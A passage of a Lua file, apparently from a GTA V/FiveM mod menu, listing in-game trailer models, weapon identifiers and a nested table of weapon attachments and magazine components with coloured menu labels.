		"ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"
	}
	local b6 = {
		"WEAPON_KNIFE", "WEAPON_KNUCKLE", "WEAPON_NIGHTSTICK", "WEAPON_HAMMER", "WEAPON_BAT", "WEAPON_GOLFCLUB", "WEAPON_CROWBAR", "WEAPON_BOTTLE", "WEAPON_DAGGER", "WEAPON_HATCHET", "WEAPON_MACHETE", "WEAPON_FLASHLIGHT", "WEAPON_SWITCHBLADE", "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL", "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL", "WEAPON_STUNGUN", "WEAPON_FLAREGUN", "WEAPON_MARKSMANPISTOL", "WEAPON_REVOLVER", "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG", "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_COMBATPDW", "WEAPON_GUSENBERG", "WEAPON_MACHINEPISTOL", "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2", "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE", "WEAPON_PUMPSHOTGUN", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_BULLPUPSHOTGUN", "WEAPON_ASSAULTSHOTGUN", "WEAPON_MUSKET", "WEAPON_HEAVYSHOTGUN", "WEAPON_DBSHOTGUN", "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE", "WEAPON_GRENADELAUNCHER", "WEAPON_GRENADELAUNCHER_SMOKE", "WEAPON_RPG", "WEAPON_STINGER", "WEAPON_FIREWORK", "WEAPON_HOMINGLAUNCHER", "WEAPON_GRENADE", "WEAPON_STICKYBOMB", "WEAPON_PROXMINE", "WEAPON_BZGAS", "WEAPON_SMOKEGRENADE", "WEAPON_MOLOTOV", "WEAPON_FIREEXTINGUISHER", "WEAPON_PETROLCAN", "WEAPON_SNOWBALL", "WEAPON_FLARE", "WEAPON_BALL"
	}
	local b7 = {
		Melee = {
			BaseballBat = {
				id = "weapon_bat", name = "~h~~r~> ~s~Baseball Bat", bInfAmmo = false, mods = {}
			}, BrokenBottle = {
				id = "weapon_bottle", name = "~h~~r~> ~s~Broken Bottle", bInfAmmo = false, mods = {}
			}, Crowbar = {
				id = "weapon_Crowbar", name = "~h~~r~> ~s~Crowbar", bInfAmmo = false, mods = {}
			}, Flashlight = {
				id = "weapon_flashlight", name = "~h~~r~> ~s~Flashlight", bInfAmmo = false, mods = {}
			}, GolfClub = {
				id = "weapon_golfclub", name = "~h~~r~> ~s~Golf Club", bInfAmmo = false, mods = {}
			}, BrassKnuckles = {
				id = "weapon_knuckle", name = "~h~~r~> ~s~Brass Knuckles", bInfAmmo = false, mods = {}
			}, Knife = {
				id = "weapon_knife", name = "~h~~r~> ~s~Knife", bInfAmmo = false, mods = {}
			}, Machete = {
				id = "weapon_machete", name = "~h~~r~> ~s~Machete", bInfAmmo = false, mods = {}
			}, Switchblade = {
				id = "weapon_switchblade", name = "~h~~r~> ~s~Switchblade", bInfAmmo = false, mods = {}
			}, Nightstick = {
				id = "weapon_nightstick", name = "~h~~r~> ~s~Nightstick", bInfAmmo = false, mods = {}
			}, BattleAxe = {
				id = "weapon_battleaxe", name = "~h~~r~> ~s~Battle Axe", bInfAmmo = false, mods = {}
			}
		}, Handguns = {
			Pistol = {
				id = "weapon_pistol", name = "~h~~r~> ~s~Pistol", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_PISTOL_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_PISTOL_CLIP_02"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"
						}
					}
				}
			}, PistolMK2 = {
				id = "weapon_pistol_mk2", name = "~h~~r~> ~s~Pistol MK 2", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_TRACER"
						}, {
							name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"
						}, {
							name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"
						}, {
							name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_FMJ"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Mounted Scope", id = "COMPONENT_AT_PI_RAIL"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH_02"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Compensator", id = "COMPONENT_AT_PI_COMP"
						}, {
							name = "~h~~r~> ~s~Suppessor", id = "COMPONENT_AT_PI_SUPP_02"
						}
					}
				}
			}, CombatPistol = {
				id = "weapon_combatpistol", name = "~h~Combat Pistol", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_02"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
						}
					}
				}
			}, APPistol = {
				id = "weapon_appistol", name = "AP Pistol", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_APPISTOL_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_APPISTOL_CLIP_02"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
						}
					}
				}
			}, StunGun = {
				id = "weapon_stungun", name = "~h~~r~> ~s~Stun Gun", bInfAmmo = false, mods = {}
			}, Pistol50 = {
				id = "weapon_pistol50", name = "~h~~r~> ~s~Pistol .50", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_PISTOL50_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_PISTOL50_CLIP_02"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"
						}
					}
				}
			}, SNSPistol = {
				id = "weapon_snspistol", name = "~h~~r~> ~s~SNS Pistol", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SNSPISTOL_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SNSPISTOL_CLIP_02"
						}
					}
				}
			}, SNSPistolMkII = {
				id = "weapon_snspistol_mk2", name = "~h~~r~> ~s~SNS Pistol Mk II", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"
						}, {
							name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"
						}, {
							name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"
						}, {
							name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Mounted Scope", id = "COMPONENT_AT_PI_RAIL_02"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH_03"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Compensator", id = "COMPONENT_AT_PI_COMP_02"
						}, {
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"
						}
					}
				}
			}, HeavyPistol = {
				id = "weapon_heavypistol", name = "~h~~r~> ~s~Heavy Pistol", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_02"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
						}
					}
				}
			}, VintagePistol = {
				id = "weapon_vintagepistol", name = "~h~~r~> ~s~Vintage Pistol", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_02"
						}
					}, BarrelAttachments = {
						{
							"Suppressor", id = "COMPONENT_AT_PI_SUPP"
						}
					}
				}
			}, FlareGun = {
				id = "weapon_flaregun", name = "~h~~r~> ~s~Flare Gun", bInfAmmo = false, mods = {}
			}, MarksmanPistol = {
				id = "weapon_marksmanpistol", name = "~h~~r~> ~s~Marksman Pistol", bInfAmmo = false, mods = {}
			}, HeavyRevolver = {
				id = "weapon_revolver", name = "~h~~r~> ~s~Heavy Revolver", bInfAmmo = false, mods = {}
			}, HeavyRevolverMkII = {
				id = "weapon_revolver_mk2", name = "~h~~r~> ~s~Heavy Revolver Mk II", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_TRACER"
						}, {
							name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"
						}, {
							name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"
						}, {
							name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_FMJ"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
						}, {
							name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Compensator", id = "COMPONENT_AT_PI_COMP_03"
						}
					}
				}
			}, DoubleActionRevolver = {
				id = "weapon_doubleaction", name = "~h~~r~> ~s~Double Action Revolver", bInfAmmo = false, mods = {}
			}, UpnAtomizer = {
				id = "weapon_raypistol", name = "~h~~r~> ~s~Up-n-Atomizer", bInfAmmo = false, mods = {}
			}
		}, SMG = {
			MicroSMG = {
				id = "weapon_microsmg", name = "~h~~r~> ~s~Micro SMG", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MICROSMG_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MICROSMG_CLIP_02"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
						}
					}
				}
			}, SMG = {
				id = "weapon_smg", name = "~h~~r~> ~s~SMG", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SMG_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SMG_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_SMG_CLIP_03"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO_02"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
						}
					}
				}
			}, SMGMkII = {
				id = "weapon_smg_mk2", name = "~h~~r~> ~s~SMG Mk II", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_SMG_MK2_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_SMG_MK2_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_SMG_MK2_CLIP_TRACER"
						}, {
							name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_SMG_MK2_CLIP_INCENDIARY"
						}, {
							name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"
						}, {
							name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_SMG_MK2_CLIP_FMJ"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS_SMG"
						}, {
							name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"
						}, {
							name = "~h~~r~> ~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_SMG_MK2"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, Barrel = {
						{
							name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_SB_BARREL_01"
						}, {
							name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_SB_BARREL_02"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
						}, {
							name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
						}, {
							name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
						}, {
							name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
						}, {
							name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
						}, {
							name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
						}, {
							name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
						}, {
							name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
						}
					}
				}
			}, AssaultSMG = {
				id = "weapon_assaultsmg", name = "~h~~r~> ~s~Assault SMG", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_02"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
						}
					}
				}
			}, CombatPDW = {
				id = "weapon_combatpdw", name = "~h~~r~> ~s~Combat PDW", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMBATPDW_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMBATPDW_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_COMBATPDW_CLIP_03"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
						}
					}
				}
			}, MachinePistol = {
				id = "weapon_machinepistol", name = "~h~~r~> ~s~Machine Pistol ", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_03"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"
						}
					}
				}
			}, MiniSMG = {
				id = "weapon_minismg", name = "~h~~r~> ~s~Mini SMG", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MINISMG_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MINISMG_CLIP_02"
						}
					}
				}
			}, UnholyHellbringer = {
				id = "weapon_raycarbine", name = "~h~~r~> ~s~Unholy Hellbringer", bInfAmmo = false, mods = {}
			}
		}, Shotguns = {
			PumpShotgun = {
				id = "weapon_pumpshotgun", name = "~h~~r~> ~s~Pump Shotgun", bInfAmmo = false, mods = {
					Flashlight = {
						{
							"name = Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_SR_SUPP"
						}
					}
				}
			}, PumpShotgunMkII = {
				id = "weapon_pumpshotgun_mk2", name = "~h~~r~> ~s~Pump Shotgun Mk II", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Dragon Breath Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"
						}, {
							name = "~h~~r~> ~s~Steel Buckshot Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"
						}, {
							name = "~h~~r~> ~s~Flechette Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"
						}, {
							name = "~h~~r~> ~s~Explosive Slugs", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
						}, {
							name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
						}, {
							name = "~h~~r~> ~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_SR_SUPP_03"
						}, {
							name = "~h~~r~> ~s~Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"
						}
					}
				}
			}, SawedOffShotgun = {
				id = "weapon_sawnoffshotgun", name = "~h~~r~> ~s~Sawed-Off Shotgun", bInfAmmo = false, mods = {}
			}, AssaultShotgun = {
				id = "weapon_assaultshotgun", name = "~h~~r~> ~s~Assault Shotgun", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_02"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
						}
					}
				}
			}, BullpupShotgun = {
				id = "weapon_bullpupshotgun", name = "~h~~r~> ~s~Bullpup Shotgun", bInfAmmo = false, mods = {
					Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
						}
					}
				}
			}, Musket = {
				id = "weapon_musket", name = "~h~~r~> ~s~Musket", bInfAmmo = false, mods = {}
			}, HeavyShotgun = {
				id = "weapon_heavyshotgun", name = "~h~~r~> ~s~Heavy Shotgun", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
						}
					}
				}
			}, DoubleBarrelShotgun = {
				id = "weapon_dbshotgun", name = "~h~~r~> ~s~Double Barrel Shotgun", bInfAmmo = false, mods = {}
			}, SweeperShotgun = {
				id = "weapon_autoshotgun", name = "~h~~r~> ~s~Sweeper Shotgun", bInfAmmo = false, mods = {}
			}
		}, AssaultRifles = {
			AssaultRifle = {
				id = "weapon_assaultrifle", name = "~h~~r~> ~s~Assault Rifle", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_03"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MACRO"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
						}
					}
				}
			}, AssaultRifleMkII = {
				id = "weapon_assaultrifle_mk2", name = "~h~~r~> ~s~Assault Rifle Mk II", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"
						}, {
							name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"
						}, {
							name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"
						}, {
							name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
						}, {
							name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"
						}, {
							name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, Barrel = {
						{
							name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_AR_BARREL_01"
						}, {
							name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_AR_BARREL_0"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
						}, {
							name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
						}, {
							name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
						}, {
							name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
						}, {
							name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
						}, {
							name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
						}, {
							name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
						}, {
							name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
						}
					}
				}
			}, CarbineRifle = {
				id = "weapon_carbinerifle", name = "~h~~r~> ~s~Carbine Rifle", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Box Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_03"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"
						}
					}, Flashlight = {
						{
							name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
						}
					}, BarrelAttachments = {
						{
							name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
						}
					}, Grips = {
						{
							name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
						}
					}
				}
			}, CarbineRifleMkII = {
				id = "weapon_carbinerifle_mk2", name = "~h~~r~> ~s~Carbine Rifle Mk II ", bInfAmmo = false, mods = {
					Magazines = {
						{
							name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_01"
						}, {
							name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_02"
						}, {
							name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"
						}, {
							name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"
						}, {
							name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"
						}, {
							name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"
						}
					}, Sights = {
						{
							name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
						}, {
